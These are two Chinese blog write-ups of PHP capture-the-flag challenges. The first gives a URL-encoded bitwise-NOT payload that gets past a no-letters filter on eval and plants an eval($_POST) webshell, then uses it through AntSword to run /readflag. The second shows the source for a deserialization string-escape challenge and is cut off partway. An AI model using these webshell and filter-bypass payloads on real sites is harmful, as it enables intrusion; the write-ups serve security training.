# 804
<div id="article_content" class="article_content clearfix">
        <link rel="stylesheet" href="https://csdnimg.cn/release/blogv2/dist/mdeditor/css/editerView/kdoc_html_views-1a98987dfd.css">
        <link rel="stylesheet" href="https://csdnimg.cn/release/blogv2/dist/mdeditor/css/editerView/ck_htmledit_views-25cebea3f9.css">
                <div id="content_views" class="markdown_views prism-atom-one-dark">
                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
                    </svg>
                    <p><img src="https://img-blog.csdnimg.cn/20210302214325303.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3d1eWFvd2FuZ2NodWFu,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p> 
<pre data-index="0" class="prettyprint"><code class="prism language-php has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;"><span class="token delimiter important">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
            <span class="token variable">$code</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
                    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token operator">&gt;</span><span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
                                        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"This is too Long."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                                                <span class="token punctuation">}</span>
                    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"/[A-Za-z0-9]+/"</span><span class="token punctuation">,</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
                                        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"NO."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                                                <span class="token punctuation">}</span>
                    @<span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
            <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment">// ?&gt;</span>
<div class="hljs-button {2}" data-title="复制"></div></code><ul class="pre-numbering" style=""><li style="color: rgb(153, 153, 153);">1</li><li style="color: rgb(153, 153, 153);">2</li><li style="color: rgb(153, 153, 153);">3</li><li style="color: rgb(153, 153, 153);">4</li><li style="color: rgb(153, 153, 153);">5</li><li style="color: rgb(153, 153, 153);">6</li><li style="color: rgb(153, 153, 153);">7</li><li style="color: rgb(153, 153, 153);">8</li><li style="color: rgb(153, 153, 153);">9</li><li style="color: rgb(153, 153, 153);">10</li><li style="color: rgb(153, 153, 153);">11</li><li style="color: rgb(153, 153, 153);">12</li><li style="color: rgb(153, 153, 153);">13</li><li style="color: rgb(153, 153, 153);">14</li><li style="color: rgb(153, 153, 153);">15</li><li style="color: rgb(153, 153, 153);">16</li><li style="color: rgb(153, 153, 153);">17</li></ul></pre> 
<p>接收code，过滤了长度大于40的，过滤了字母数字<br> url编码绕过</p> 
<pre data-index="1" class="prettyprint"><code class="prism language-php has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;">phpinfo
<span class="token punctuation">(</span><span class="token operator">~</span><span class="token operator">%</span><span class="token number">8</span>F<span class="token operator">%</span><span class="token number">97</span><span class="token operator">%</span><span class="token number">8</span>F<span class="token operator">%</span><span class="token number">96</span><span class="token operator">%</span><span class="token number">91</span><span class="token operator">%</span><span class="token number">99</span><span class="token operator">%</span><span class="token number">90</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<div class="hljs-button {2}" data-title="复制"></div></code><ul class="pre-numbering" style=""><li style="color: rgb(153, 153, 153);">1</li><li style="color: rgb(153, 153, 153);">2</li></ul></pre> 
<pre data-index="2" class="prettyprint"><code class="prism language-php has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;">http<span class="token punctuation">:</span><span class="token comment">//4e9fc55c-aaab-41a3-bf62-be69923517cb.node3.buuoj.cn/?code=(~%8F%97%8F%96%91%99%90)();</span>
<div class="hljs-button {2}" data-title="复制"></div></code><ul class="pre-numbering" style=""><li style="color: rgb(153, 153, 153);">1</li></ul></pre> 
<p><img src="https://img-blog.csdnimg.cn/20210302214849139.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3d1eWFvd2FuZ2NodWFu,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br> 同过get上传木马</p> 
<pre data-index="3" class="prettyprint"><code class="prism language-php has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;"><span class="token delimiter important">&lt;?php</span> 
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$a</span><span class="token operator">=</span><span class="token single-quoted-string string">'assert'</span><span class="token punctuation">;</span>
<span class="token variable">$b</span><span class="token operator">=</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token variable">$b</span><span class="token punctuation">;</span>
<span class="token comment">//%9E%8C%8C%9A%8D%8B</span>
<span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;br&gt;"</span><span class="token punctuation">;</span>
<span class="token variable">$c</span><span class="token operator">=</span><span class="token single-quoted-string string">'(eval($_POST["test"]))'</span><span class="token punctuation">;</span>
<span class="token variable">$d</span><span class="token operator">=</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token variable">$d</span><span class="token punctuation">;</span>
<span class="token comment">//%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%DD%8B%9A%8C%8B%DD%A2%D6%D6</span>
 <span class="token delimiter important">?&gt;</span>
<div class="hljs-button {2}" data-title="复制"></div></code><ul class="pre-numbering" style=""><li style="color: rgb(153, 153, 153);">1</li><li style="color: rgb(153, 153, 153);">2</li><li style="color: rgb(153, 153, 153);">3</li><li style="color: rgb(153, 153, 153);">4</li><li style="color: rgb(153, 153, 153);">5</li><li style="color: rgb(153, 153, 153);">6</li><li style="color: rgb(153, 153, 153);">7</li><li style="color: rgb(153, 153, 153);">8</li><li style="color: rgb(153, 153, 153);">9</li><li style="color: rgb(153, 153, 153);">10</li><li style="color: rgb(153, 153, 153);">11</li><li style="color: rgb(153, 153, 153);">12</li><li style="color: rgb(153, 153, 153);">13</li></ul></pre> 
<pre data-index="4" class="prettyprint"><code class="prism language-php has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;"><span class="token operator">?</span>code<span class="token operator">=</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token operator">%</span><span class="token number">9</span>E<span class="token operator">%</span><span class="token number">8</span>C<span class="token operator">%</span><span class="token number">8</span>C<span class="token operator">%</span><span class="token number">9</span>A<span class="token operator">%</span><span class="token number">8</span>D<span class="token operator">%</span><span class="token number">8</span>B<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token operator">%</span><span class="token constant">D7</span><span class="token operator">%</span><span class="token number">9</span>A<span class="token operator">%</span><span class="token number">89</span><span class="token operator">%</span><span class="token number">9</span>E<span class="token operator">%</span><span class="token number">93</span><span class="token operator">%</span><span class="token constant">D7</span><span class="token operator">%</span><span class="token constant">DB</span><span class="token operator">%</span><span class="token constant">A0</span><span class="token operator">%</span><span class="token constant">AF</span><span class="token operator">%</span><span class="token constant">B0</span><span class="token operator">%</span><span class="token constant">AC</span><span class="token operator">%</span><span class="token constant">AB</span><span class="token operator">%</span><span class="token constant">A4</span><span class="token operator">%</span><span class="token constant">DD</span><span class="token operator">%</span><span class="token number">8</span>B<span class="token operator">%</span><span class="token number">9</span>A<span class="token operator">%</span><span class="token number">8</span>C<span class="token operator">%</span><span class="token number">8</span>B<span class="token operator">%</span><span class="token constant">DD</span><span class="token operator">%</span><span class="token constant">A2</span><span class="token operator">%</span><span class="token constant">D6</span><span class="token operator">%</span><span class="token constant">D6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<div class="hljs-button {2}" data-title="复制"></div></code><ul class="pre-numbering" style=""><li style="color: rgb(153, 153, 153);">1</li></ul></pre> 
<p><img src="https://img-blog.csdnimg.cn/20210302224910878.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3d1eWFvd2FuZ2NodWFu,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br> 之后连接木马<br> <img src="https://img-blog.csdnimg.cn/20210302225243424.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3d1eWFvd2FuZ2NodWFu,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br> <img src="https://img-blog.csdnimg.cn/20210302225515115.png" alt="在这里插入图片描述"><br> 这里是要执行readflag然后才能读取flag<br> 用蚁剑的<img src="https://img-blog.csdnimg.cn/20210303000550556.png" alt="在这里插入图片描述"><br> 选择PHP_GC_UAF模式<br> 进入到一个虚拟shell模式，输入/readflag，得到flag<br> <img src="https://img-blog.csdnimg.cn/20210303000740936.png" alt="在这里插入图片描述"></p>
                </div><div data-report-view="{&quot;mod&quot;:&quot;1585297308_001&quot;,&quot;spm&quot;:&quot;1001.2101.3001.6548&quot;,&quot;dest&quot;:&quot;https://blog.csdn.net/wuyaowangchuan/article/details/114295378&quot;,&quot;extend1&quot;:&quot;pc&quot;,&quot;ab&quot;:&quot;new&quot;}"><div></div></div>
                <link href="https://csdnimg.cn/release/blogv2/dist/mdeditor/css/editerView/markdown_views-98b95bb57c.css" rel="stylesheet">
                <link href="https://csdnimg.cn/release/blogv2/dist/mdeditor/css/style-c216769e99.css" rel="stylesheet">
        </div>


<div id="article_content" class="article_content clearfix">
        <link rel="stylesheet" href="https://csdnimg.cn/release/blogv2/dist/mdeditor/css/editerView/kdoc_html_views-1a98987dfd.css">
        <link rel="stylesheet" href="https://csdnimg.cn/release/blogv2/dist/mdeditor/css/editerView/ck_htmledit_views-25cebea3f9.css">
                <div id="content_views" class="markdown_views prism-atom-one-dark">
                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
                    </svg>
                    <pre data-index="0" class="prettyprint"><code class="has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;">知识点：字符串绕过长度限制  反序列字符串化逃逸   
<div class="hljs-button {2}" data-title="复制"></div></code><ul class="pre-numbering" style=""><li style="color: rgb(153, 153, 153);">1</li></ul></pre> 
<h1><a name="t0"></a><a id="_3"></a>知识点</h1> 
<h2><a name="t1"></a><a id="_4"></a>字符串绕过长度限制</h2> 
<p>例如：</p> 
<pre data-index="1" class="prettyprint"><code class="prism language-php has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;"><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'nickname'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">10</span>
<div class="hljs-button {2}" data-title="复制"></div></code><ul class="pre-numbering" style=""><li style="color: rgb(153, 153, 153);">1</li></ul></pre> 
<p>我们可以传一个<code>nickname[]</code>来绕过。</p> 
<h2><a name="t2"></a><a id="_10"></a>反序列字符串化逃逸</h2> 
<p>这边的内容，可以看这篇文章:<br> <code>https://blog.csdn.net/shinygod/article/details/123284185</code><br> 里面通过一个专门的题目详细讲解了反序列字符串化逃逸的两种情况。</p> 
<h1><a name="t3"></a><a id="_15"></a>解题思路</h1> 
<p>可以用dirsearch来扫，当然如果运气好的话说不定会直接找到 。<br> 说来也巧再做这题之前，红明谷杯刚结束，里面题目的源码，都可以访问www.zip来得到。</p> 
<h2><a name="t4"></a><a id="configphp_18"></a>config.php</h2> 
<p>明显是通过访问config.php来得到flag</p> 
<pre data-index="2" class="prettyprint"><code class="prism language-php has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;"><span class="token delimiter important">&lt;?php</span>
	<span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'hostname'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'127.0.0.1'</span><span class="token punctuation">;</span>
	<span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'root'</span><span class="token punctuation">;</span>
	<span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>
	<span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'database'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>
	<span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>
<span class="token operator">?</span><span class="token operator">&gt;</span>
<div class="hljs-button {2}" data-title="复制"></div></code><ul class="pre-numbering" style=""><li style="color: rgb(153, 153, 153);">1</li><li style="color: rgb(153, 153, 153);">2</li><li style="color: rgb(153, 153, 153);">3</li><li style="color: rgb(153, 153, 153);">4</li><li style="color: rgb(153, 153, 153);">5</li><li style="color: rgb(153, 153, 153);">6</li><li style="color: rgb(153, 153, 153);">7</li></ul></pre> 
<p>可以从index.php顺者把代码读一遍，就当作练习了。</p> 
<h2><a name="t5"></a><a id="indexphp_31"></a>index.php</h2> 
<pre data-index="3" class="set-code-hide prettyprint"><code class="prism language-php has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;"><span class="token delimiter important">&lt;?php</span>
	<span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'class.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span><span class="token comment">//如果username存在则向客户端传一个报头</span>
		<span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Location: profile.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//用来重定向到profile.php页面</span>
		<span class="token keyword">exit</span><span class="token punctuation">;</span><span class="token comment">//当前index.php结束</span>
	<span class="token punctuation">}</span>
	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span><span class="token comment">//判断账号和密码的格式是否正确</span>
		<span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
		<span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

		<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">3</span> <span class="token keyword">or</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token comment">//长度不符合则结束</span>
			<span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Invalid user name'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

		<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">3</span> <span class="token keyword">or</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">16</span><span class="token punctuation">)</span> 
			<span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Invalid password'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

		<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token operator">-&gt;</span><span class="token function">login</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span><span class="token comment">//调用class.php中user类的login方法，然后再用user的父类进行过滤</span>
			<span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$username</span><span class="token punctuation">;</span><span class="token comment">//存一个username的session变量</span>
			<span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Location: profile.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token keyword">exit</span><span class="token punctuation">;</span>	
		<span class="token punctuation">}</span>
		<span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
			<span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Invalid user name or password'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>
	<span class="token punctuation">}</span>
	<span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
<span class="token operator">?</span><span class="token operator">&gt;</span>
<div class="hljs-button {2}" data-title="复制"></div></code><div class="hide-preCode-box"><span class="hide-preCode-bt" data-report-view="{&quot;spm&quot;:&quot;1001.2101.3001.7365&quot;}"><img class="look-more-preCode contentImg-no-view" src="https://csdnimg.cn/release/blogv2/dist/pc/img/newCodeMoreWhite.png" alt="" title=""></span></div><ul class="pre-numbering" style=""><li style="color: rgb(153, 153, 153);">1</li><li style="color: rgb(153, 153, 153);">2</li><li style="color: rgb(153, 153, 153);">3</li><li style="color: rgb(153, 153, 153);">4</li><li style="color: rgb(153, 153, 153);">5</li><li style="color: rgb(153, 153, 153);">6</li><li style="color: rgb(153, 153, 153);">7</li><li style="color: rgb(153, 153, 153);">8</li><li style="color: rgb(153, 153, 153);">9</li><li style="color: rgb(153, 153, 153);">10</li><li style="color: rgb(153, 153, 153);">11</li><li style="color: rgb(153, 153, 153);">12</li><li style="color: rgb(153, 153, 153);">13</li><li style="color: rgb(153, 153, 153);">14</li><li style="color: rgb(153, 153, 153);">15</li><li style="color: rgb(153, 153, 153);">16</li><li style="color: rgb(153, 153, 153);">17</li><li style="color: rgb(153, 153, 153);">18</li><li style="color: rgb(153, 153, 153);">19</li><li style="color: rgb(153, 153, 153);">20</li><li style="color: rgb(153, 153, 153);">21</li><li style="color: rgb(153, 153, 153);">22</li><li style="color: rgb(153, 153, 153);">23</li><li style="color: rgb(153, 153, 153);">24</li><li style="color: rgb(153, 153, 153);">25</li><li style="color: rgb(153, 153, 153);">26</li><li style="color: rgb(153, 153, 153);">27</li></ul></pre> 
<h2><a name="t6"></a><a id="profilephp_61"></a>profile.php</h2> 
<pre data-index="4" class="set-code-hide prettyprint"><code class="prism language-php has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;"><span class="token delimiter important">&lt;?php</span>
	<span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'class.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token constant">null</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span><span class="token comment">//如果还没有登录则提示先登录。</span>
		<span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Login First'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>	
	<span class="token punctuation">}</span>
	<span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token variable">$profile</span><span class="token operator">=</span><span class="token variable">$user</span><span class="token operator">-&gt;</span><span class="token function">show_profile</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//查找账户，并返回个人信息</span>
	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$profile</span>  <span class="token operator">==</span> <span class="token constant">null</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span><span class="token comment">//如果个人信息不存在，则到update.php页面</span>
		<span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Location: update.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
	<span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
		<span class="token variable">$profile</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$profile</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//如果个人信息存在，则对其进行反序列化，</span>
		<span class="token variable">$phone</span> <span class="token operator">=</span> <span class="token variable">$profile</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'phone'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
		<span class="token variable">$email</span> <span class="token operator">=</span> <span class="token variable">$profile</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'email'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
		<span class="token variable">$nickname</span> <span class="token operator">=</span> <span class="token variable">$profile</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'nickname'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
		<span class="token variable">$photo</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$profile</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'photo'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token comment">//读取photo，也就是移动过后的图片，base64加密</span>
		<span class="token comment">//重点在于file_get_contents这个，我们可以用它来读取config.php从而拿到flag</span>
<span class="token operator">?</span><span class="token operator">&gt;</span>
<div class="hljs-button {2}" data-title="复制"></div></code><div class="hide-preCode-box"><span class="hide-preCode-bt" data-report-view="{&quot;spm&quot;:&quot;1001.2101.3001.7365&quot;}"><img class="look-more-preCode contentImg-no-view" src="https://csdnimg.cn/release/blogv2/dist/pc/img/newCodeMoreWhite.png" alt="" title=""></span></div><ul class="pre-numbering" style=""><li style="color: rgb(153, 153, 153);">1</li><li style="color: rgb(153, 153, 153);">2</li><li style="color: rgb(153, 153, 153);">3</li><li style="color: rgb(153, 153, 153);">4</li><li style="color: rgb(153, 153, 153);">5</li><li style="color: rgb(153, 153, 153);">6</li><li style="color: rgb(153, 153, 153);">7</li><li style="color: rgb(153, 153, 153);">8</li><li style="color: rgb(153, 153, 153);">9</li><li style="color: rgb(153, 153, 153);">10</li><li style="color: rgb(153, 153, 153);">11</li><li style="color: rgb(153, 153, 153);">12</li><li style="color: rgb(153, 153, 153);">13</li><li style="color: rgb(153, 153, 153);">14</li><li style="color: rgb(153, 153, 153);">15</li><li style="color: rgb(153, 153, 153);">16</li><li style="color: rgb(153, 153, 153);">17</li><li style="color: rgb(153, 153, 153);">18</li><li style="color: rgb(153, 153, 153);">19</li></ul></pre> 
<p>注意了，<a href="https://so.csdn.net/so/search?q=file_get_contents&amp;spm=1001.2101.3001.7020" target="_blank" class="hl hl-1" data-report-view="{&quot;spm&quot;:&quot;1001.2101.3001.7020&quot;,&quot;dest&quot;:&quot;https://so.csdn.net/so/search?q=file_get_contents&amp;spm=1001.2101.3001.7020&quot;,&quot;extra&quot;:&quot;{\&quot;searchword\&quot;:\&quot;file_get_contents\&quot;}&quot;}" data-report-click="{&quot;spm&quot;:&quot;1001.2101.3001.7020&quot;,&quot;dest&quot;:&quot;https://so.csdn.net/so/search?q=file_get_contents&amp;spm=1001.2101.3001.7020&quot;,&quot;extra&quot;:&quot;{\&quot;searchword\&quot;:\&quot;file_get_contents\&quot;}&quot;}" data-tit="file_get_contents" data-pretit="file_get_contents">file_get_contents</a>这个函数明显是突破口，但它读取的是photo，且$profile反序列化了，那问题来了photo是哪的？怎么构造的？又该怎么把他变为config.php呢？先把这些问题放一放，因为第一步如果个人信息不存在，则会跳到update.php页面</p> 
<h2><a name="t7"></a><a id="updatephp_85"></a>update.php</h2> 
<pre data-index="5" class="set-code-hide prettyprint"><code class="prism language-php has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;"><span class="token delimiter important">&lt;?php</span>
	<span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'class.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token constant">null</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span><span class="token comment">//如果账号为空则登录</span>
		<span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Login First'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>	
	<span class="token punctuation">}</span>
	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'phone'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'email'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'nickname'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'photo'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span><span class="token comment">//所有信息要存在</span>

		<span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
		<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^\d{11}$/'</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'phone'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">//匹配11次都要是数字，否则die</span>
			<span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Invalid phone'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

		<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^[_a-zA-Z0-9]{1,10}@[_a-zA-Z0-9]{1,10}\.[_a-zA-Z0-9]{1,10}$/'</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'email'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">//同样是匹配</span>
			<span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Invalid email'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		
